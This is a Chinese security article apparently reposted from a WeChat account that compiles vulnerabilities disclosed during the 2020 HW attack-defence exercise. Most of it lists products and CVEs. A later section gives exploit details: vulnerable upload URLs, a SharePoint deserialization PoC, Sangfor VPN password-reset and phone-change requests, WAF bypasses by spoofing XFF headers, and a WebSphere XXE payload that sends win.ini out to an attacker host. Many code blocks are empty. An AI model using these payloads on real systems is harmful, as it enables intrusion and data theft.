\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/bz\_prNH6Y3LBd3Sj7V5uFQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic0gagSDaL6Rd0CajicXciakNbHYicsIRicZqzk64QjHiaJvEEswTZBibupRze19j7jH8W1TDic2Ypzp9jGUg/640?wx_fmt=jpeg)

**2020 年 HW 已结束，小编汇总了 HW 期间公布的漏洞，供各位红蓝双方安全研究使用。来自公众号：HACK 之道。**  

**9 月 11 日 - 9 月 23 日漏洞（来自补天）**

1．深信服 EDR 某处命令执行漏洞，危害级别：危急

2．深信服 SSL VPN 远程代码执行漏洞，危害级别：危急

3．绿盟 UTS 综合威胁探针信息泄露漏洞，危害级别：危急，官方已发布补丁

4．Apache DolphinScheduler 远程代码执行漏洞 (CVE-2020-11974)，危害级别：危急，官方已发布补丁

5．Apache Cocoon security vulnerability (CVE-2020-11991)，危害级别：危急，官方已发布补丁

6．天融信 TopApp-LB 负载均衡系统 SQL 注入漏洞，危害级别：高危

7．用友 GRP-u8 命令执行漏洞，危害级别：危急

8．泛微云桥任意文件读取漏洞，危害级别：高危

9．齐治堡垒机前台远程命令执行漏洞，危害级别：危急

10．联软准入系统任意文件上传漏洞 EXP 公开，危害级别：危急

11．PAN-OS 远程代码执行漏洞，危害级别：危急

12．天融信 NGFW 下一代防火墙漏洞辟谣，危害级别：无

13．山石网科下一代防火墙 SG-6000 漏洞辟谣，危害级别：无

14．Nagios 命令执行漏洞，危害级别：危急

15．Weblogic 远程命令执行漏洞，危害级别：危急

16．IE 浏览器远程代码执行漏洞，危害级别：高危

17．网御星云 VPN 老版本存在漏洞，危害级别：高危

18．微软 NetLogon 权限提升漏洞，危害级别：危急

19．致远 A8 文件上传漏洞，危害级别：危急

20．致远 A8 反序列化漏洞，危害级别：危急

21．深信服 VPN 任意用户添加漏洞，危害级别：危急

22．拓尔思 TRSWAS5.0 文件读取漏洞，危害级别：中危

23．Wordpress File-manager 任意文件上传，危害级别：高危

24．Apache DolphinScheduler 权限提升漏洞 (CVE-2020-13922) ，危害级别：高危

25．致远 OA 任意文件写入漏洞，危害级别：危急

26．Microsoft Exchange 远程代码执行漏洞通告，危害级别：危急

27．Spectrum Protect Plus 任意代码执行漏洞，危害级别：高危

28．深信服 SSL VPN Nday - Pre Auth 任意密码重置漏洞，危害级别：高危

29．深信服 SSL VPN 修改绑定手机号码漏洞，等级：高危

30．McAfee Web Gateway 多个高危漏洞，危害级别：高危

31．Yii2 框架反序列化远程命令执行漏洞，危害级别：高危

32．微软 SQL Server 报表服务远程代码执行漏洞（CVE-2020-0618），危害级别：高危

33．Spring 框架 RFD 攻击漏洞通告，危害级别：中危

34．VMware Fusion 权限提升漏洞（CVE-2020-3980），危害级别：中危

35．Aruba Clearpass 远程命令执行漏洞（CVE-2020-7115），危害级别：高危

36．Yii2 框架反序列化远程命令执行漏洞二次更新，危害级别：高危

37．Apache Superset 远程代码执行漏洞（CVE-2020-13948）危害级别：高危

38． Fastadmin 文件上传漏洞，危害级别：高危

39．WebSphere Application Server XXE 漏洞，危害级别：高危

40．建文工程项目管理软件任意文件上传漏洞，危害级别：高危

**来自白泽 Sec 整理的漏洞列表**

1.VMware Fusion cve-2020-3980 权限提升

2.Apache Cocoon security vulnerability cve-2020-11991  
3.Spring 框架 RFD（文件下载）  
4.CVE-2020-0618-SQLServer 报表服务远程代码执行漏洞  
5.CVE-2020-7115-Aruba Clearpass 远程代码执行漏洞  
6.CVE-2020-15148-Yii 2 框架反序列化远程命令执漏洞  
7.CVE-2020-13948-Apache Superset 远程代码执行  
8\. 深信服 SSL VPN Nday - Pre Auth 修改绑定手机  
9\. 深信服 SSL VPN Nday - Pre Auth 任意密码重置  
10.CVE-2020-1472-NetLogon 特权提升漏洞  
11.CVE-2020-2040-PAN-OS 远程代码执行漏洞  
12.ThinkPHP3.x 注入漏洞  
13\. 用友 GRP-u8 SQL 注入  
14\. 泛微云桥任意文件读取  
15\. 联软准入文件上传漏洞  
16\. 奇治堡垒机 Python 代码注入  
17\. 用友 GRP-u8 命令执行漏洞  
18.Nagios 命令执行  
19.Weblogic 远程命令执行  
20\. 网御星云 VPN 老版本漏洞  
21\. 拓尔思 5.0 文件读取漏洞  
22.wordpress File-manager 任意文件上传  
23\. 天融信 TOPApp-LB 负载均衡 SQL 注入漏洞  
24\. 绿盟 UTS 综合威胁探针管理员任意登录  
25\. 深信服 EDR3.2.21 远程代码执行  
26.CVE-2020-11974-Apache DolphinScheduler 远程执行代码漏洞  
27.CVE-2020-11107-XAMPP 任意命令执行漏洞  
28.CVE-2020-16875-Exchange 远程代码执行漏洞  
29\. 深信服 EDR 远程代码 执行漏洞  
30.CVE-2020-24616-Jackson 多个反序列化安全漏洞  
31\. 宝塔面板 888 端口 pma 未授权访问  
32\. 深信服 EDR 任意用户登录漏洞  
33\. 泛微 e-cology 某版本存在 RCE 漏洞  
34.CVE-2020-13933-Apache Shiro 权限绕过漏洞  
35\. 通达 OA11.6 未授权远程代码执行漏洞  
36\. 深信服 EDR 远程命令执行漏洞  
37\. 天融信数据防泄漏系统未授权修改管理员密码  
38.CVE-2020-11995-Apache Dubbo 远程代码执行漏洞  
39.PHPCMS v9 全版本前台 RCE  
40.CVE-2019-0230-Struts2 远程代码执行漏洞  
41.CVE-2020-13699-TeamViewer 全版本无密码连接  
42.CVE-2020-13921-Apache SkyWalking SQL 注入漏洞  
43.CVE-2020-13925-Apache Kylin 远程命令执行漏洞  
44.CVE-2020-1350-Windows DNS Server 远程代码执行漏洞  
45.CVE-2020-14645-Weblogic 命令执行漏洞  
46.CVE-2020-8194-Citrix 代码注入等系列漏洞  
47.CVE-2020-10977-Gitlab CE/EE 任意文件读取 / RCE  
48.CVE-2020-8193-Citrix ADC 远程代码执行  
49.CVE-2020-5902-F5 BIG-IP TMUI 远程代码执行漏洞  
50.CVE-2020-9498-Apache Guacamole RDP 远程代码执行漏洞  
51.CVE-2020-9480-Apache Spark 远程代码执行漏洞  
52.CVE-2020-11989-Apache Shiro 身份验证绕过漏洞  
53.CVE-2020-1948-Apache Dubbo 反序列化漏洞  
54.CVE-2020-9483-Apache SkyWalkingSQL 注入漏洞  
55.CVE-2020-4450-WebSphere 远程代码执行漏洞  
56\. 用友 NC6.5 反序列化漏洞  
57.CVE-2020-3956-VMware Cloud Director 代码注入漏洞  
58.CVE-2020-5410-Spting-Cloud-Config-Server 目录遍历  
59.CVE-2020-1956-Apache Kylin 远程命令执行漏洞  
60.Fastjson <= 1.2.68 远程命令执行漏洞  
61.CVE-2020-9484-Apache Tomcat session 持久化远程代码执行漏洞  
62.vBulletin 5.6.1 SQL 注入漏洞  
63.CVE-2020-11651-SaltStack 认证绕过漏洞 / 命令执行  
64.CVE-2020-11652-SaltStack 目录遍历漏洞  
65\. 通达 OA11.4 存在越权登录漏洞  
66.CVE-2020-4362-WebSphere 远程代码执行漏洞  
67\. 通达 OA11.5 存在多处 SQL 注入漏洞  
68.CVE-2020-1947-ShardingShpere 命令执行漏洞  
69\. 通达 OA 文件包含漏洞和 SQL 注入漏洞  
70.CVE-2020-0796 SMBV3 远程命令执行漏洞  
71.CVE-2020-0688-Exchange 远程代码执行漏洞  
72.CVE-2020-1938-Apache Tomcat 文件包含漏洞  
73.CVE-2019-17564-Apache Dubbo 反序列化漏洞  
78.CVE-2020-0601 - 签名伪造  
79.ThinkPHP6 任意文件操作漏洞  
80.CVE-2020-2551-Weblogic 反序列化漏洞  
81.CVE-2020-2555-Weblogic 反序列化漏洞  
82.CVE-2020-9951 Apple Safari 远程执行代码漏洞  
83.CVE-2020-9992 Apple Xcode 远程命令执行漏洞  
84.Citrix Systems 多款产品存在安全漏洞  
85.CVE-2020-8245  
86.CVE-2020-8246  
87.CVE-2020-8247  
88.CVE-2020-11861 KM03709900 操作代理，本地特权漏洞  
89.CVE-2020-11699 SpamTitan 7.07 多个 RCE 漏洞  
90.CVE-2020-11699  
91.CVE-2020-11699  
92.CVE-2020-11699  
93.CVE-2020-7115 Aruba Clearpass 远程命令执行漏洞  
94.CVE-2020-0688 Microsoft Exchange Server 远程代码执行漏洞  
95.CVE-2020-1035 Microsoft Internet Explorer VBScript Engine 远程代码执行漏洞  
96.CVE-2020-1048 Microsoft Windows Print Spooler 安全漏洞  
97.CVE-2020-1092 Microsoft Internet Explorer 远程代码执行漏洞  
98.CVE-2020-16875 Microsoft Exchange 远程代码执行漏洞  
99.CVE-2020-8028 SUSE 访问控制错误漏洞  
100.CVE-2020-25751 Joomla paGO Commerce 2.5.9.0 SQL 注入  
101.CVE-2020-16860 Microsoft Dynamics 365 远程代码执行漏洞  
102.CVE-2020-15920 Mida Solutions eFramework ajaxreq.php 命令注入漏洞  
103.CVE-2020-12109 TP-Link 云摄像头 NCXXX 系列存在命令注入漏洞  
104.CVE-2020-5421 SPRING FRAMEWORK 反射型文件下载漏洞  
105.CVE-2020-25790 Typesetter CMS 任意文件上传  
106.CVE-2020-4643 IBM WebSphere 存在 XXE 外部实体注入漏洞  
107.webTareas 存在多个安全漏洞  
108.CNNVD-202009-1177  
109.CNNVD-202009-1176  
110.CNNVD-202009-1175  
112.CVE-2020-1350 Microsoft Windows Server DNS Server 缓冲区错误漏洞  
113.PHPCMS V9 存在 RCE 漏洞  
114.QEMU-KVM 越界读写漏洞  
115.Cochip 无线路由器绕过认证泄露账号密码漏洞  
116.CVE-2020-4450 WebSphere 远程代码执行漏洞  
117.CVE-2020-13933 Apache shiro 权限绕过漏洞

**来自** **IDLab** **整理的漏洞详情**

#### **01\. 联软任意文件上传漏洞**

```
已知存在漏洞的url如下：http://IP:80/uai/newDevRegist/updateDevUploadinfo.htm（只有201904-1SP起才存在该漏洞）http://IP:80/uai/download/uploadfileToPath.htm（受影响的版本都存在该漏洞）http://IP:80/uai/newDevRegist/newDevRegist/newDevRegist/..;/..;/updateDevUploadinfo.htm（只有201904-1SP起才存在该漏洞）http://IP:80/uai/download/download/download/..;/..;/uploadfileToPath.htm （受影响的版本都存在该漏洞）

```

#### **02\. 网瑞达资源访问控制系统命令执行漏洞**

```
br

```

#### **03.Exchange Server 远程代码执行漏洞**

```
br

```

#### **04.SharePoint 远程代码执行漏洞**

1\. 使用 ysoserial 工具生成 payload

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0Oicx8r0SrndlJW341WghcxY8mV5GJxQSpuZblHrlwXMCGjdS7iay2ZF4g/640?wx_fmt=png)

2\. 将生成的 payload 拼接到 poc

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0OTlfk0ftMWNbtcnzmYsJoo48mFDsxLnZrFHzrOicOPKJH0gQeXp8sFxA/640?wx_fmt=png)

3\. 服务器 iis 主进程中启动了 calc.exe

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0Ou4dt8xTCWTTgIdr0BE0pZ94KU1EOmlQ7B8BDOIoX3EOibAmAtHFvicHw/640?wx_fmt=png)

pox.xml

```
<DataSet>  <xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">    <xs:element System.Data.Services.Internal.ExpandedWrapper\`2\[\[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\],\[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\]\], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:anyType" minOccurs="0"/>              </xs:sequence>            </xs:complexType>          </xs:element>        </xs:choice>      </xs:complexType>    </xs:element>  </xs:schema>  <diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">    <somedataset>      <Exp\_x0020\_Table diffgr:id="Exp Table1" msdata:rowOrder="0" diffgr:hasChanges="inserted">        <pwn xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">        <ExpandedElement/>        <ProjectedProperty0>            <MethodName>Deserialize</MethodName>            <MethodParameters>                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">这里放payload</anyType>            </MethodParameters>            <ObjectInstance xsi:type="LosFormatter"></ObjectInstance>        </ProjectedProperty0>        </pwn>      </Exp\_x0020\_Table>    </somedataset>  </diffgr:diffgram></DataSet>

```

#### **05.Apache Cocoon XML 注入**

漏洞利用条件有限必须是 apacheCocoon 且使用了 StreamGenerator, 也就是说只要传输的数据被解析就可以实现了。  

```
br

```

#### **06.Horde Groupware Webmail Edition 远程命令执行**

来源: https://srcincite.io/pocs/zdi-20-1051.py.txt  

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0OeuZD1XBC3HsaKBFGW9evkYDmFV8MD51gSpSzwYyXGg5lCdzmDM2Wuw/640?wx_fmt=png)

#### **07\. 泛微云桥任意文件读取升级玩法**

1、简单说说昨天泛微云桥的报告, 输入文件路径 -> 读取文件内容, 我们读了一下代码后发现这还能读取文件目录。

2、参数不填写绝对路径写进文本内容就是当前的目录, 产生了一个新的漏洞 “目录遍历”

/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0O1FYsORYsoPRjZOFJuRgdZiaZWualbO4lPmfo8hwojSVqF5DaQFGn2Mg/640?wx_fmt=png)

3、目录遍历 + 文件读取, 我们能做的事情就很多了, 比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx 代理配置、访问日志、D 盘迅雷下载。  

```
br

```

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0OnSZzXWwShOshMLHPuXdPgV32XteguNibZZnHb5MWKLTDwvTot8dDjLg/640?wx_fmt=png)

#### **08\. 某讯云 WAF 中修改 XFF 头会导致 IP 封禁策略失效**

攻击者真实 IP 被封禁的情况下，还是可以通过修改 XFF 头后继续对网站进行访问，即 IP 封禁措施会无效。

#### **09.ThinkAdmin v6 未授权列目录 / 任意文件读取**

参考：https://github.com/zoujingli/ThinkAdmin/issues/244

```
br

```

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0OT6nGYwBgV3Opuk2fg2ju2xncu8PGSMSrs6WxZBoS2JPFMLtO0RtibFw/640?wx_fmt=png)  

```
br

```

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgBpJXPyh5lWzcAlXIc7jJ0OQh68zjrJCqtByJdRqibgib3zSsMrwHz4EOkOpe7P88bHcTTWz6C3ibS3Q/640?wx_fmt=png)

#### **10.Joomla! paGO Commerce 2.5.9.0 存在 SQL 注入**

```
br

```

Sqlmap poc  

```
br

```

#### **11\. 某盟 waf 封禁绕过**

XFF 伪造字段地址为 127.0.0.1，导致 waf 上看不见攻击者地址  

#### **12.Typesetter CMS 任意文件上传**

参考：https://github.com/Typesetter/Typesetter/issues/674  

#### **13.CLTPHP 存在任意文件删除漏洞**

```
br

```

参数 sqlfilename 未经任何处理，直接带入 unlink 函数中删除，导致程序在实现上存在任意文件删除漏洞，攻击者可通过该漏洞删除任意文件。  

#### **14.UsualToolCMS-8.0 sql 注入漏洞**

#### payload：

```
br

```

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgAgzlIUru7cQk5JOHiaDBPGGCiaL9ORaibeSqHbNOFqctmicYgp3g8Vq40d5mGAhq5tLQhAv4AXjiaH1BA/640?wx_fmt=png)

#### **15.TP-Link 云摄像头 NCXXX 系列存在命令注入漏洞**

```
br

```

**16.SpamTitan 7.07 多个 RCE 漏洞**

```
br

```

**17.Yii 框架反序列化 RCE 利用链 exp**

```
br

```

**18.BSPHP 存在未授权访问**

该处泄漏的用户名和登陆 ip  

```
br

```

![](https://mmbiz.qpic.cn/mmbiz_png/K9JoBxX2CgAgzlIUru7cQk5JOHiaDBPGGsuNHIsjHjvQ4G7SRHjVXoiac4KwTEhmX5KzPZTfe6gSntIaPVdWiak6A/640?wx_fmt=png)

#### **19.fastadmin 最新版前台 getshell**

```
br

```

#### **20\. 某信服 SSL VPN 任意密码重置**

#### 某信服 VPN 加密算法使用了默认的 key, 攻击者构利用 key 构造重置密码数据包从而修改任意用户的密码利用: 需要登录账号 M7.6.6R1 版本默认 key 为 20181118，M7.6.1 版本默认 key 为 20100720sangfor\_key.py 脚本：  

```
br

```

POC:  

https://<PATH>/por/changepwd.csp(post)sessReq=clusterd&sessid=0&str=RC4\_STR&len=RC4\_STR&len=(sangfor\_key.py 脚本计算后结果的值)

#### **21\. 某信服 SSL VPN 修改任意账户手机号**

修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码

利用: 需要登录账号  

```
https://<PATH>/por/changetelnum.csp?apiversion=1(POST)newtel=TARGET\_PHONE&sessReq=clusterd&username=TARGET\_USERNAME&grpid=0&sessid=0&ip=127.0.0.1

```

**22.WebSphere XXE POC**

具体分析：具体分析在这里 https://paper.seebug.org/1342/  

```
xml如下：<!DOCTYPE x \[     <!ENTITY % aaa SYSTEM "file:///C:/Windows/win.ini">     <!ENTITY % bbb SYSTEM "http://yourip:8000/xx.dtd">     %bbb; \]> <definitions >  &ddd; </definitions> xx.dtd如下：<!ENTITY % ccc '<!ENTITY ddd '<import namespace="uri" location="http://yourip:8000/xxeLog?%aaa;"/>'>'>%ccc;

```

* * *

**关注公众号: HACK 之道**  
  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**